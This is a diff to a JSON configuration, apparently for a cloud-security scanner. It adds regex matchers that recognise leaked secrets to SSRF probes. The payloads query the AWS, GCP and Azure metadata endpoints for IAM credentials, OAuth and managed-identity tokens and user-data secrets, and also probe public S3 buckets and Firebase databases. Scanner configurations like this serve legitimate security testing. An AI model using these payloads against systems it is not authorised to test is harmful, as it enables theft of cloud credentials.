@@ -7,14 +7,17 @@
       "probes": [
         {
           "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "matchers": [{"type": "regex", "pattern": "AccessKeyId|(ASIA|AKIA)[A-Z0-9]{16}", "description": "IAM credentials leaked via IMDSv1 role endpoint"}],
           "description": "List IAM role names available on this instance"
         },
         {
           "payload": "http://169.254.169.254/latest/dynamic/instance-identity/document",
+          "matchers": [{"type": "regex", "pattern": "\"accountId\"\\s*:\\s*\"\\d{12}\"|\"instanceId\"\\s*:\\s*\"i-[0-9a-f]+\"", "description": "EC2 instance-identity document leak"}],
           "description": "Region, accountId, instanceId disclosure"
         },
         {
           "payload": "http://169.254.169.254/latest/user-data",
+          "matchers": [{"type": "regex", "pattern": "(ASIA|AKIA)[A-Z0-9]{16}|-----BEGIN|export AWS_", "description": "user-data secret leak"}],
           "description": "User-data script — often contains plaintext secrets"
         }
       ],
@@ -50,6 +53,7 @@
       "probes": [
         {
           "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+          "matchers": [{"type": "regex", "pattern": "\"access_token\"\\s*:\\s*\"ya29\\.[A-Za-z0-9_-]{20,}", "description": "GCP service-account OAuth2 token leak"}],
           "description": "Default service account OAuth2 token",
           "headers": {
             "Metadata-Flavor": "Google"
@@ -57,6 +61,7 @@
         },
         {
           "payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+          "matchers": [{"type": "regex", "pattern": "^[a-z][-a-z0-9]{4,28}[a-z0-9]$", "description": "GCP project-id metadata value"}],
           "description": "GCP project ID disclosure",
           "headers": {
             "Metadata-Flavor": "Google"
@@ -83,6 +88,7 @@
       "probes": [
         {
           "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "matchers": [{"type": "regex", "pattern": "\"azEnvironment\"|\"compute\"\\s*:|\"vmId\"", "description": "Azure IMDS compute/network metadata JSON"}],
           "description": "VM metadata",
           "headers": {
             "Metadata": "true"
@@ -90,6 +96,7 @@
         },
         {
           "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+          "matchers": [{"type": "regex", "pattern": "\"access_token\"\\s*:\\s*\"eyJ[A-Za-z0-9_.-]+", "description": "Azure Managed Identity JWT bearer token leak"}],
           "description": "Managed Identity bearer token",
           "headers": {
             "Metadata": "true"
@@ -122,10 +129,12 @@
       "probes": [
         {
           "payload": "?list-type=2",
+          "matchers": [{"type": "regex", "pattern": "<ListBucketResult", "description": "S3 public bucket object listing"}],
           "description": "S3 v2 list-objects — public bucket dump"
         },
         {
           "payload": "?acl",
+          "matchers": [{"type": "regex", "pattern": "<URI>http://acs\\.amazonaws\\.com/groups/global/AllUsers</URI>|<AccessControlPolicy", "description": "S3 ACL exposed / public AllUsers grant"}],
           "description": "S3 ACL inspection — exposes grants"
         }
       ],
@@ -167,6 +176,7 @@
       "probes": [
         {
           "payload": "/.json",
+          "matchers": [{"type": "not_word", "words": ["Permission denied"]}, {"type": "regex", "pattern": "^\\s*\\{.*\"", "description": "Firebase RTDB JSON root dump (permissive read rules)"}],
           "description": "Root dump — works on default-allow rules"
         }
       ],
